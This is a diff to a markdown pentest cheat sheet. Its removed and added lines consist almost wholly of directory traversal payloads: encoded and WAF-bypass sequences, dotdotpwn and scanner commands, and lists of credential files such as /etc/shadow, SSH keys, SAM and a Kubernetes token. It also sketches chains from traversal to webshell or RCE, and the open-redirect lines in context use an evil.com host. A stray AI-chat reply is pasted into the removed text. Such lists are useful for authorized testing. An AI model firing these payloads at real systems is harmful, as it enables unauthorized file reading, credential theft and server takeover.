@@ -762,197 +762,11 @@ uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,v
 - **Key confusion**: {"url":"https://legit.com","redirect":"https://evil.com"} 
 - **Nested object**: {"config":{"redirect":"https://evil.com"}} 
 - **Mixed encoding JSON**: {"redirect":"https:%2F%2Fevil.com"}
+
 # Directory Traversal
 
-* [Methodology](#methodology)
-    * [URL Encoding](#url-encoding)
-    * [Double URL Encoding](#double-url-encoding)
-    * [Unicode Encoding](#unicode-encoding)
-    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
-    * [Mangled Path](#mangled-path)
-    * [NULL Bytes](#null-bytes)
-    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
-* [Exploit](#exploit)
-    * [UNC Share](#unc-share)
-    * [ASPNET Cookieless](#asp-net-cookieless)
-    * [IIS Short Name](#iis-short-name)
-    * [Java URL Protocol](#java-url-protocol)
-* [Path Traversal](#path-traversal)
-    * [Linux Files](#linux-files)
-    * [Windows Files](#windows-files)
-* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
-
-    ```powershell
-    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
-    ```
-## Methodology
-
-### URL Encoding
-
-| Character | Encoded |
-| --- | -------- |
-| `.` | `%2e` |
-| `/` | `%2f` |
-| `\` | `%5c` |
-
-```powershell
-../
-..\
-..\/
-%2e%2e%2f
-%252e%252e%252f
-%c0%ae%c0%ae%c0%af
-%uff0e%uff0e%u2215
-%uff0e%uff0e%u2216
-```
-
-```ps1
-{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
-```
-
-### Double URL Encoding
-
-Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.
-
-| Character | Encoded |
-| --- | -------- |
-| `.` | `%252e` |
-| `/` | `%252f` |
-| `\` | `%255c` |
-
-```ps1
-{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
-{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
-```
-
-### Unicode Encoding
-
-| Character | Encoded |
-| --- | -------- |
-| `.` | `%u002e` |
-| `/` | `%u2215` |
-| `\` | `%u2216` |
-
-```js
-{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
-```
-### Overlong UTF-8 Unicode Encoding
-
-The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.
-
-| Character | Encoded |
-| --- | -------- |
-| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
-| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
-| `\` | `%c0%5c`, `%c0%80%5c` |
-
-### Mangled Path
-
-Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.
-
-```powershell
-..././
-...\.\
-```
-
-**Example:**: Mirasys DVMS Workstation <=5.12.6
-
-```ps1
-{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
-```
-
-### NULL Bytes
-
-A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.
-
-```js
-{{BaseURL}}/.%00./.%00./etc/passwd
-```
-```js
-{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
-```
-
-### Reverse Proxy URL Implementation
-
-Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.
-
-```powershell
-..;/
-```
-
-A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.
-
-```js
-{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
-```
-### UNC Share
-
-A UNC (Universal Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported by other operating systems.
-
-An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.
-
-```powershell
-\\localhost\c$\windows\win.ini
-```
-
-Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.
-
-### IIS Short Name
-
-The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.
-
-* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
-
-    ```ps1
-    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
-    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
-    ```
-
-* [bitquark/shortscan](https://github.com/bitquark/shortscan)
-
-    ```ps1
-    shortscan http://example.org/
-    ```
-### Windows Files
-
-The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.
-
-```powershell
-C:\Windows\win.ini
-C:\windows\system32\license.rtf
-```
-
-A list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)
-
-```powershell
-c:/inetpub/logs/logfiles
-c:/inetpub/wwwroot/global.asa
-c:/inetpub/wwwroot/index.asp
-c:/inetpub/wwwroot/web.config
-c:/sysprep.inf
-c:/sysprep.xml
-c:/sysprep/sysprep.inf
-c:/sysprep/sysprep.xml
-c:/system32/inetsrv/metabase.xml
-c:/sysprep.inf
-c:/sysprep.xml
-c:/sysprep/sysprep.inf
-c:/sysprep/sysprep.xml
-c:/system volume information/wpsettings.dat
-c:/system32/inetsrv/metabase.xml
-c:/unattend.txt
-c:/unattend.xml
-c:/unattended.txt
-c:/unattended.xml
-c:/windows/repair/sam
-c:/windows/repair/system
-```
-## 📁 Directory Traversal — Test Cases & Payloads
 ```text
 file, filename, filepath, path, dir, directory, folder, page, doc, document, download, include, resource, view, template, theme, skin, pdf, img, image, icon, style, css, js, script, asset, config, config_file, config_path, log, log_file, log_path, backup, restore, target, location, lang, language, locale, base, basepath, root, home, url, uri, endpoint, slug
-```
-Let me know if you'd like this exported into a Burp Intruder wordlist, YAML config, or integrated into your passive scanner logic. I can also help you build a matcher that auto-switches encoding variants (`../`, `%2e%2e%2f`, etc.) for each parameter. Ready to modularize it 🔧📁
----
 ```
 ### **1. Basic Traversal Payloads**
 ../, ..\, ..//, ..\\, .../, ...\\
@@ -967,25 +781,28 @@ Let me know if you'd like this exported into a Burp Intruder wordlist, YAML conf
 %u002e%u002e%u2215
 
 ### **3. Bypass Techniques**
-```text
 ..././, ...\\.\\, ..;/, ..%00/
 \\\\localhost\\c$\\windows\\win.ini
 ////////../../../../etc/passwd
 
 ### **4. Target Files (Linux)**
-```text
-/etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /proc/version
-/home/$USER/.bash_history, /home/$USER/.ssh/id_rsa
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/version
+/home/$USER/.bash_history
+/home/$USER/.ssh/id_rsa
 /run/secrets/kubernetes.io/serviceaccount/token
 
 ### **5. Target Files (Windows)**
-```text
 c:/windows/system32/license.rtf
-c:/boot.ini, c:/inetpub/wwwroot/web.config
-c:/sysprep/sysprep.xml, c:/system32/inetsrv/metabase.xml
+c:/boot.ini
+c:/inetpub/wwwroot/web.config
+c:/sysprep/sysprep.xml
+c:/system32/inetsrv/metabase.xml
 
 ### **6. Log File Injection Targets**
-```text
 /var/log/apache/access.log
 /var/log/nginx/error.log
 /usr/local/apache2/log/error_log
@@ -994,229 +811,50 @@ c:/sysprep/sysprep.xml, c:/system32/inetsrv/metabase.xml
 
 file, filename, path, filepath, page, doc, download, include, template, view, url, resource, dir, folder, asset
 
-### **8. HTTP Injection Points**
-- **Query**: `GET /?file=../../etc/passwd`
-- **Path**: `GET /../../etc/passwd`
-- **Header**: `X-File: ../../etc/passwd`
-- **Cookie**: `file=../../etc/passwd`
-- **JSON**:
-  ```json
-  { "file": "../../etc/passwd" }
-  ```
-# **✅ Directory Traversal Attack – Complete Test Case (with Bypass Cases)**
+## 📂 Basic Directory Traversal
+- **Single dot**: ./  
+- **Double dot**: ../  
+- **Triple dot**: ../../  
+- **Root escape**: /../  
+- **Windows backslash**: ..\\  
+- **Mixed slashes**: ..\/..\\
 
-1 Basic Path Traversal (“../” sequences)
-2 Encoded Path Traversal (URL, Unicode, UTF-8)
-3 Double-Encoded Traversal
-4 Null Byte Injection (Legacy PHP/Java)
-5 Absolute Path Injection
-6 Filter Bypass using Nested Traversal
-7 Path Normalization Vulnerability
-8 Directory Traversal via File Upload
-9 Traversal inside ZIP, TAR extraction
-10 Traversal in API parameters (/download?file=)
-11 Log File / Sensitive File Exposure
-12 OS Command File Read Chaining
-13 Traversal via Path Overwrite (%2e%2e/)
-14 Mixed Encoding Traversal
-15 SSRF → Traversal on server-side FS
+## 🔑 Encoded Traversal Payloads
+- **URL encoded dot dot**: %2e%2e/  
+- **Double URL encoded**: %252e%252e/  
+- **UTF-16 encoded**: %u002e%u002e/  
+- **Overlong UTF-8**: %c0%ae%c0%ae/  
+- **Null byte injection**: ../../etc/passwd%00
 
----
+## 🗂️ Directory Listing Exploits
+- **Basic listing**: /images/ → shows file list  
+- **Hidden files**: /admin/.git/  
+- **Config exposure**: /config/  
+- **Backup files**: /backup/  
+- **Temp files**: /tmp/  
+- **Log files**: /logs/
 
-# **2. Sample Payloads (Core Attack Payloads)**
+## 🌀 Advanced Traversal Payloads
+- **Absolute path injection**: /etc/passwd  
+- **Windows system files**: C:\\Windows\\system32\\drivers\\etc\\hosts  
+- **Chained traversal**: ....//....//etc/passwd  
+- **Dot slash confusion**: ./././etc/passwd  
+- **Mixed encoding**: %2e%2e%5c%2e%2e/etc/passwd
 
-*(Clean structure — normal payload list)*
+## 🧩 Parameter Injection
+- **File parameter**: ?file=../../etc/passwd  
+- **Path parameter**: ?path=../admin/  
+- **Doc parameter**: ?doc=../../../../windows/win.ini  
+- **Include parameter**: ?include=../../config.php  
+- **Download parameter**: ?download=../../../secret.txt
 
-```
-2.1 Basic Traversal
-../../../../etc/passwd
-```
-
-```
-2.2 Windows Traversal
-..\..\..\windows\win.ini
-```
-
-```
-2.3 Absolute Path Injection
-/etc/shadow
-```
-
-```
-2.4 Traversal Using Null Byte
-../../etc/passwd%00.jpg
-```
-
-```
-2.5 API Traversal Attempt
-/download?file=../../../../etc/hosts
-```
-
-```
-2.6 Traversal via Image Parameter
-?path=../../uploads/
-```
-
-```
-2.7 Within ZIP/TAR Extraction
-../../../../var/www/html/shell.php
-```
-
-```
-2.8 Directory Enumeration
-../../../../
-```
-
----
-
-# **3. Sample Payloads (Updated With Real Payloads for Learning)**
-
-*(Actual offensive payloads widely used in real-world exploitation)*
-
-```
-3.1 Unix Sensitive File Read
-../../../../../../etc/shadow
-```
-
-```
-3.2 SSH Key Extraction
-../../../../../home/user/.ssh/id_rsa
-```
-
-```
-3.3 Apache Log Poisoning → RCE Chain
-../../../../var/log/apache2/access.log
-```
-
-```
-3.4 PHP Session Stealing
-../../../../var/lib/php/sessions/sess_12345
-```
-
-```
-3.5 Configuration File Leak
-../../../../etc/mysql/my.cnf
-```
-
-```
-3.6 Read Application Secrets
-../../../../app/config/config.json
-```
-
-```
-3.7 Windows SAM File Read
-..\..\..\Windows\System32\config\SAM
-```
-
-```
-3.8 Tomcat Credentials Read
-../../../../conf/tomcat-users.xml
-```
-
-```
-3.9 NGINX Passwords
-../../../../etc/nginx/.htpasswd
-```
-
-```
-3.10 Source Code Read
-../../../../var/www/html/index.php
-```
-
----
-
-# **4. Bypass Techniques (Filter, Encoding, WAF, Normalization)**
-
-*(Bypass payload list only)*
-
-```
-4.1 URL Encoded Traversal
-..%2f..%2f..%2fetc%2fpasswd
-```
-
-```
-4.2 Double URL Encoding
-..%252f..%252fetc%252fpasswd
-```
-
-```
-4.3 Mixed Encoding Technique
-..%2e%2e/%2e%2e/%2e%2e/etc/passwd
-```
-
-```
-4.4 Unicode Bypass
-..%c0%af..%c0%af..%c0%afetc/passwd
-```
-
-```
-4.5 Hex Encoded Bypass
-..%2e%2e%5cetc%5cpasswd
-```
-
-```
-4.6 Overlong UTF-8 Bypass
-..%c0%ae%c0%ae/
-```
-
-```
-4.7 Path Injection Using Dot Trick
-....//....//etc/passwd
-```
-
-```
-4.8 Backslash Injection for Windows
-..\\..\\..\\boot.ini
-```
-
-```
-4.9 Filtering Bypass with Fake Folder Prefix
-..%2f..%2fsub/../etc/passwd
-```
-
-```
-4.10 Trailing Slash Normalization Bypass
-../../../../etc/passwd/
-```
-
----
-
-# **5. Advanced Attack Chains (Real-World Exploitation)**
-
-```
-5.1 Directory Traversal → Log Poisoning → RCE
-../../../../var/log/nginx/access.log
-```
-
-```
-5.2 Directory Traversal → Read DB Credentials → DB Takeover
-../../../../../var/www/app/.env
-```
-
-```
-5.3 Directory Traversal → Config Read → Admin Password Leak
-../../../../../config/admin.php
-```
-
-```
-5.4 ZIP Slip (Unzip Traversal) → Webshell Deployment
-../../../../var/www/html/shell.php
-```
-
-```
-5.5 Path Traversal → LFI → RCE Chain
-../../../../var/www/html/index.php?page=../../../../etc/passwd
-```
-
-```
-5.6 Web Cache → Traversal → Credential Theft
-../../../../../etc/apache2/.htpasswd
-```
-
-```
-5.7 Traversal → Private SSH Key Leak → Full Server Access
-../../../../home/appuser/.ssh/id_rsa
-```
+## 📦 JSON / Body Tricks
+- **JSON path injection**: {"file":"../../etc/passwd"}  
+- **Nested JSON**: {"config":{"path":"../../admin"}}  
+- **Array JSON**: {"files":["../../etc/passwd","../../config.php"]}  
+- **Escaped JSON**: {"file":"..\/..\/etc\/passwd"}  
+- **Base64 JSON**: {"file":"Li4vLi4vZXRjL3Bhc3N3ZA=="}
+  
 # HTTP Parameter Pollution
 
 ## Methodology
